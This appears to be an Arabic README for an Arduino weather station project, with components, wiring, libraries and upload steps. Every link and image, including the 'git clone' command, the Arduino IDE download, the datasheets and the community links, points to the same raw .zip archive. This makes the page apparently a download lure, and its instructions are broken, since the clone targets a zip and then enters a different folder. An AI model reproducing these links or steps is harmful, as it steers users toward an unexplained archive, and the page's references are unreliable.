# 🌤️ Arduino Weather Station - محطة الطقس الذكية

> محطة طقس ذكية متكاملة بالأردوينو تقيس درجة الحرارة والرطوبة والإضاءة مع شاشة OLED وتخزين البيانات

![Arduino Weather Station](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

## 📋 المحتويات

- [نظرة عامة](#نظرة-عامة)
- [المكونات المطلوبة](#المكونات-المطلوبة)
- [المخطط التخطيطي](#المخطط-التخطيطي)
- [التوصيلات](#التوصيلات)
- [تثبيت المكتبات](#تثبيت-المكتبات)
- [رفع الكود](#رفع-الكود)
- [الميزات](#الميزات)
- [صور المشروع](#صور-المشروع)
- [استكشاف الأخطاء](#استكشاف-الأخطاء)
- [روابط مفيدة](#روابط-مفيدة)

## 🎯 نظرة عامة

محطة الطقس الذكية هذه تستخدم Arduino Uno لقياس وعرض:
- 🌡️ **درجة الحرارة** (مئوية وفهرنهايت)
- 💧 **الرطوبة النسبية** (%)
- ☀️ **شدة الإضاءة** (مستوى الضوء)
- 📱 **إرسال البيانات** عبر البلوتوث
- 💾 **حفظ البيانات** في ذاكرة EEPROM

---

## 🔧 المكونات المطلوبة

| المكون | الصورة | الوصف | الكمية | السعر التقريبي |
|---------|---------|-------|---------|----------------|
| **Arduino Uno R3** | ![Arduino Uno](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | المتحكم الرئيسي للمشروع | 1 | $25 |
| **DHT22 Sensor** | ![DHT22](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | حساس الحرارة والرطوبة عالي الدقة | 1 | $10 |
| **LDR Sensor** | ![LDR](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | مقاوم ضوئي لقياس شدة الإضاءة | 1 | $2 |
| **OLED SSD1306** | ![OLED Display](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | شاشة عرض OLED 128×64 بكسل | 1 | $8 |
| **HC-05 Bluetooth** | ![Bluetooth Module](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | وحدة البلوتوث للاتصال اللاسلكي | 1 | $6 |
| **مقاومات** | ![Resistors](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | 10kΩ للـ LDR و 220Ω للـ LED | حسب الحاجة | $3 |
| **أسلاك توصيل** | ![Jumper Wires](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | أسلاك ذكر-أنثى وذكر-ذكر | 1 مجموعة | $5 |
| **Breadboard** | ![Breadboard](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | لوحة التجارب للتوصيلات | 1 | $5 |

**💰 التكلفة الإجمالية التقريبية: $64**

---

## 🔌 التوصيلات

### Arduino Uno → DHT22
```
VCC  → 3.3V
GND  → GND
DATA → Pin 2
```

### Arduino Uno → OLED SSD1306
```
VCC → 3.3V
GND → GND
SCL → A5
SDA → A4
```

### Arduino Uno → LDR Sensor
```
LDR Pin 1 → A0
LDR Pin 2 → 10kΩ Resistor → GND
VCC → 5V → 10kΩ Resistor → A0
```

### Arduino Uno → HC-05 Bluetooth
```
VCC → 3.3V
GND → GND
RX  → Pin 3
TX  → Pin 4
```

---

## 🛠️ المخطط التخطيطي

![Circuit Diagram](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

*المخطط يوضح جميع التوصيلات بين المكونات بشكل واضح*

---

## 📚 تثبيت المكتبات

قم بتثبيت المكتبات التالية من مدير المكتبات في Arduino IDE:

```cpp
// المكتبات المطلوبة
#include <DHT.h>           // لحساس DHT22
#include <Adafruit_GFX.h>  // للرسوميات
#include <Adafruit_SSD1306.h> // لشاشة OLED
#include <SoftwareSerial.h>    // للبلوتوث
#include <EEPROM.h>            // لحفظ البيانات
```

**خطوات التثبيت:**
1. افتح Arduino IDE
2. اذهب إلى `Tools` > `Manage Libraries`
3. ابحث عن كل مكتبة واضغط `Install`

---

## ⬆️ رفع الكود

1. **تحميل الكود:**
   ```bash
   git clone https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip
   cd arduino-weather-station
   ```

2. **فتح الملف:**
   - افتح ملف `https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip` في Arduino IDE

3. **اختيار اللوحة:**
   - `Tools` > `Board` > `Arduino Uno`

4. **اختيار المنفذ:**
   - `Tools` > `Port` > اختر المنفذ الصحيح

5. **رفع الكود:**
   - اضغط على زر الرفع ⬆️

---

## ✨ الميزات

- 🎮 **واجهة بديهية** مع شاشة OLED واضحة
- 🔄 **تحديث مستمر** للبيانات كل 5 ثوان
- 📱 **اتصال بلوتوث** لمراقبة البيانات عن بعد
- 💾 **حفظ البيانات** في EEPROM لمنع فقدانها
- ⚡ **استهلاك منخفض** للطاقة
- 🌡️ **دقة عالية** في القياسات
- 🔔 **تنبيهات** عند تجاوز الحدود المحددة

---

## 📸 صور المشروع

### التجميع النهائي
![Final Assembly](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

### شاشة العرض
![Display Output](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

### التوصيلات
![Wiring](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

---

## 🐛 استكشاف الأخطاء

### مشاكل شائعة وحلولها:

| المشكلة | السبب المحتمل | الحل |
|----------|---------------|------|
| الشاشة لا تعمل | توصيلات خاطئة | تأكد من توصيل SDA/SCL بشكل صحيح |
| قراءات خاطئة من DHT22 | تأخير غير كاف | أضف delay(2000) بين القراءات |
| البلوتوث لا يتصل | إعدادات خاطئة | تأكد من Baud Rate 9600 |
| استهلاك عالي للطاقة | حلقة مستمرة | أضف وضع النوم sleep mode |

### رسائل خطأ شائعة:
- ❌ `DHT sensor error` → تحقق من التوصيلات
- ❌ `OLED not found` → تأكد من عنوان I2C
- ❌ `Memory full` → امسح بيانات EEPROM

---

## 🔗 روابط مفيدة

### للمبتدئين:
- 📖 [دليل Arduino للمبتدئين](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 🎥 [فيديوهات تعليمية](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📚 [كتاب البرمجة بـ C++](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

### وثائق المكونات:
- 🌡️ [DHT22 Datasheet](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📺 [SSD1306 OLED Guide](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📡 [HC-05 Bluetooth Tutorial](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

### أدوات مفيدة:
- 🛠️ [Arduino IDE](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📱 [تطبيق Bluetooth Terminal](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 🔧 [Fritzing للمخططات](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

### مجتمعات الدعم:
- 💬 [منتدى Arduino](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 🗨️ [Reddit Arduino](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📧 [Stack Overflow](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)

---

## 🤝 المساهمة

نرحب بمساهماتكم! يمكنكم:
- 🐞 الإبلاغ عن الأخطاء
- 💡 اقتراح ميزات جديدة
- 🔧 إرسال Pull Requests
- 📝 تحسين التوثيق

---

## 📄 الترخيص

هذا المشروع مرخص تحت رخصة MIT - راجع ملف [LICENSE](LICENSE) للتفاصيل.

---

## 👨‍💻 المطور

**KaizerAE**
- GitHub: [@KaizerAE](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
- 📧 للاستفسارات والدعم

---

⭐ **إذا أعجبك المشروع، لا تنسى إعطاء نجمة للمستودع!** ⭐

---

*تم إنشاء هذا المشروع بحب ❤️ لمجتمع الصناع والمطورين*
